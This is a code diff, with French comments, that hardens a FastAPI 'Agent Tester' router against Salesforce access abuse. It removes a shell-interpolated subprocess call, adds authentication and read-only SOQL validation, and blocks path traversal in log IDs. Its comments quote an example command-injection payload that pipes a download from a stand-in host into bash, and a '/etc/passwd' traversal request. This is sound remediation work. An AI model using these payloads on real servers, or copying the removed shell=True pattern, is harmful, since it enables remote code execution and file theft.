@@ -2,18 +2,47 @@
 Agent Tester API - Test REAL agents with Salesforce integration
 
 Uses the same agent scripts as pm_orchestrator_service_v2.py
+
+LOT-C (gem:SEC-01, gem:SEC-02, kim:SEC-01, kim:SEC-02) — ce routeur portait la
+faille la plus grave de l'audit du 21/08 : `GET /org/query?soql=...`
+interpolait son parametre d'URL dans une chaine passee a
+`subprocess.run(..., shell=<actif>)`, sans aucune authentification, joignable
+depuis Internet. `?soql=" ; curl evil.sh | bash #` s'executait sur le serveur
+avec les droits du service.
+
+Trois verrous sont poses ici, independants l'un de l'autre :
+
+  1. authentification au niveau du routeur (`dependencies=[...]`), donc valable
+     aussi pour toute route ajoutee ensuite. Le routeur declenche des
+     executions LLM facturees : anonyme, il etait aussi une ruine financiere ;
+  2. plus de shell. Le SOQL est un element de `argv`, jamais un fragment de
+     ligne de commande : `;`, `|`, `$(...)`, backticks et guillemets sont des
+     octets de donnee que `sf` recoit tels quels ;
+  3. le SOQL est valide avant d'etre transmis (requete de lecture uniquement,
+     longueur bornee), pour qu'il ne puisse pas non plus se faire passer pour
+     une option du CLI `sf`.
+
+La regle nginx qui bloque cette route en 403 sur le VPS reste en place : elle
+ne doit etre retiree qu'apres deploiement effectif de ce correctif.
 """
 import json
+import re
 import subprocess
-import os
-from fastapi import APIRouter, HTTPException
+from pathlib import Path
+
+from fastapi import APIRouter, Depends, HTTPException
 from fastapi.responses import StreamingResponse
 from pydantic import BaseModel
 
-from app.salesforce_config import salesforce_config
+from app.salesforce_config import salesforce_config, SalesforceConfigError
 from app.services.agent_executor import get_agent_executor, AGENT_CONFIG
+from app.utils.dependencies import get_current_user
 
-router = APIRouter(prefix="/agent-tester", tags=["Agent Tester"])
+router = APIRouter(
+    prefix="/agent-tester",
+    tags=["Agent Tester"],
+    dependencies=[Depends(get_current_user)],
+)
 
 # UI Agent definitions (display info only - real config is in agent_executor.py)
 AGENTS = {
@@ -40,13 +69,18 @@ def make_sse(data: dict) -> str:
 
 @router.get("/agents")
 async def list_agents():
+    # LOT-E bis : les identites d'org ne sont plus codees en dur, ces trois
+    # champs valent None quand aucune org n'est configuree. `connected` etait
+    # jusqu'ici la constante True — il annoncait une org connectee meme sans
+    # org du tout. Il reflete desormais l'etat reel de la configuration.
     return {
         "agents": AGENTS,
         "salesforce_org": {
             "alias": salesforce_config.org_alias,
             "username": salesforce_config.username,
             "instance_url": salesforce_config.instance_url,
-            "connected": True
+            "connected": salesforce_config.is_configured(),
+            "missing": salesforce_config.missing_identity(),
         }
     }
 
@@ -56,15 +90,73 @@ async def get_agent(agent_id: str):
         raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
     return AGENTS[agent_id]
 
+# gem:SEC-01 / kim:SEC-02 — le SOQL accepte est une requete de lecture, et
+# rien d'autre. Ce filtre n'est PAS ce qui bloque l'injection de commande (c'est
+# `shell=False` plus bas qui la bloque) : il empeche le parametre de se faire
+# passer pour une option du CLI `sf` (un `soql` commencant par `-`), et refuse
+# les verbes d'ecriture qu'une route de consultation n'a pas a porter.
+SOQL_MAX_LENGTH = 4000
+_SOQL_READ_ONLY = re.compile(r"^\s*SELECT\s+.+\s+FROM\s+[A-Za-z0-9_]+", re.IGNORECASE | re.DOTALL)
+
+
+def _validate_soql(soql: str) -> str:
+    """Return the SOQL to hand to the CLI, or raise HTTP 400."""
+    soql = (soql or "").strip()
+    if not soql:
+        raise HTTPException(status_code=400, detail="Parametre 'soql' vide.")
+    if len(soql) > SOQL_MAX_LENGTH:
+        raise HTTPException(
+            status_code=400,
+            detail=f"Requete SOQL trop longue ({len(soql)} > {SOQL_MAX_LENGTH} caracteres).",
+        )
+    if "\x00" in soql:
+        raise HTTPException(status_code=400, detail="Requete SOQL invalide.")
+    if not _SOQL_READ_ONLY.match(soql):
+        raise HTTPException(
+            status_code=400,
+            detail="Seules les requetes SOQL de lecture sont acceptees "
+                   "(forme attendue : SELECT ... FROM ...).",
+        )
+    return soql
+
+
 @router.get("/org/query")
 async def query_org(soql: str):
+    """
+    Execute a read-only SOQL query against the configured org.
+
+    gem:SEC-01 / kim:SEC-02 : plus de shell, plus d'interpolation. La
+    commande est une liste d'arguments — `soql` occupe une case d'`argv` et est
+    remis a `sf` tel quel. Un `;`, un `|`, un `$(...)` ou un `\`` n'a plus
+    d'interprete pour le lire : ce sont des caracteres dans une chaine.
+    """
+    soql = _validate_soql(soql)
+
+    # LOT-E bis : sans org configuree, org_alias vaut None. On refuse ici, avec
+    # un message exploitable, plutot que d'envoyer `--target-org None` au CLI.
+    try:
+        salesforce_config.require("org_alias")
+    except SalesforceConfigError as exc:
+        raise HTTPException(status_code=503, detail=str(exc))
+
     result = subprocess.run(
-        f'sf data query --query "{soql}" --target-org {salesforce_config.org_alias} --json',
-        shell=True, capture_output=True, text=True
+        [
+            "sf", "data", "query",
+            "--query", soql,
+            "--target-org", salesforce_config.org_alias,
+            "--json",
+        ],
+        shell=False,
+        capture_output=True,
+        text=True,
+        timeout=30,
     )
     if result.returncode != 0:
         raise HTTPException(status_code=400, detail=result.stderr)
-    return json.loads(result.stdout)
+    try:
+        return json.loads(result.stdout)
+    except json.JSONDecodeError:
+        raise HTTPException(status_code=502, detail="Reponse illisible du CLI Salesforce.")
 
 @router.post("/test/{agent_id}/stream")
 async def test_agent_stream(agent_id: str, request: AgentTestRequest):
@@ -100,10 +192,10 @@ async def test_agent_stream(agent_id: str, request: AgentTestRequest):
 @router.get("/workspace/files")
 async def list_workspace_files():
     files = {}
-    base_path = salesforce_config.force_app_path
+    base_path = Path(salesforce_config.force_app_path)
     for folder in ["classes", "triggers", "lwc", "flows", "objects"]:
-        folder_path = os.path.join(base_path, folder)
-        files[folder] = os.listdir(folder_path) if os.path.exists(folder_path) else []
+        folder_path = base_path / folder
+        files[folder] = sorted(p.name for p in folder_path.iterdir()) if folder_path.is_dir() else []
     return {"workspace": salesforce_config.sfdx_project_path, "files": files}
 
 @router.get("/llm/status")
@@ -123,6 +215,24 @@ async def get_llm_status():
 # ===== TEST LOGS ENDPOINTS =====
 # For debugging and post-execution analysis
 
+
+def _safe_log_id(test_id: str) -> str:
+    """
+    Reduce a log identifier to a single filename component.
+
+    Meme famille que kim:SEC-03 (traversee de repertoire), sur un troisieme
+    site que le rapport ne cite pas : `AgentTestLogger.get_log_by_filename()`
+    fait `LOGS_DIR / filename` sans controle, et recevait ici le parametre
+    d'URL tel quel. Starlette decode `%2F` dans les parametres de chemin, donc
+    `/logs/..%2F..%2F..%2Fetc%2Fpasswd.json` sortait du repertoire de logs.
+    `Path(...).name` ne laisse passer que le dernier segment : ni `..`, ni `/`,
+    ni chemin absolu.
+    """
+    safe = Path((test_id or "").strip()).name.strip()
+    if not safe or safe in (".", ".."):
+        raise HTTPException(status_code=400, detail="Identifiant de log invalide.")
+    return safe
+
 @router.get("/logs")
 async def list_test_logs(limit: int = 20):
     """List recent agent test logs for debugging"""
@@ -139,10 +249,11 @@ async def get_test_log(test_id: str):
     try:
         from app.services.agent_test_logger import get_logger
         logger = get_logger()
-        log = logger.get_log(test_id)
+        safe_id = _safe_log_id(test_id)
+        log = logger.get_log(safe_id)
         if not log:
             # Try by filename
-            log = logger.get_log_by_filename(test_id)
+            log = logger.get_log_by_filename(safe_id)
         if not log:
             raise HTTPException(status_code=404, detail=f"Log {test_id} not found")
         return log
@@ -157,9 +268,10 @@ async def get_test_log_step(test_id: str, step_number: int):
     try:
         from app.services.agent_test_logger import get_logger
         logger = get_logger()
-        log = logger.get_log(test_id)
+        safe_id = _safe_log_id(test_id)
+        log = logger.get_log(safe_id)
         if not log:
-            log = logger.get_log_by_filename(test_id)
+            log = logger.get_log_by_filename(safe_id)
         if not log:
             raise HTTPException(status_code=404, detail=f"Log {test_id} not found")
         
